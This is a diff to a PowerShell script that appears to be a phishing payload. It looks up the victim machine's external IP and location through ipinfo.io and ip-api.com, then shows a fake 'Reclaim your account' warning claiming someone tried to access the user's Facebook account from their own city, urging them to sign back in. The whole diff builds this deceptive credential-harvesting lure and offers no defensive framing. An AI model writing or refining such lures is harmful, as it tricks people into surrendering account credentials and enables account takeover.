@@ -84,13 +84,32 @@ $browserProcesses | ForEach-Object {
     }
 }
 
-Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Please authenticate your Facebook Account."
-$msgTitle = "Authentication Required"
+Add-Type -AssemblyName PresentationCore, PresentationFramework
+
+# Define the API base URL
+$apiUrl = "http://ip-api.com/json/"
+
+# Get the computer's external IP address
+$ipAddress = (Invoke-RestMethod -Uri "http://ipinfo.io/json").ip
+
+# Query the IP-API service to get location information
+$response = Invoke-RestMethod -Uri "$apiUrl$ipAddress"
+
+# Extract location data
+$city = $response.city
+$region = $response.regionName
+$country = $response.country
+
+# Create a message for the user
+$msgBody = "Someone just tried to access your Facebook account from $city, $region, Please sign back in to secure your account"
+$msgTitle = "Reclaim your account"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
-$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+
+# Show a message box with location information
+$Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
 Write-Host "The user clicked: $Result"
+
 
 
 # Define the URL to the image hosted on GitHub
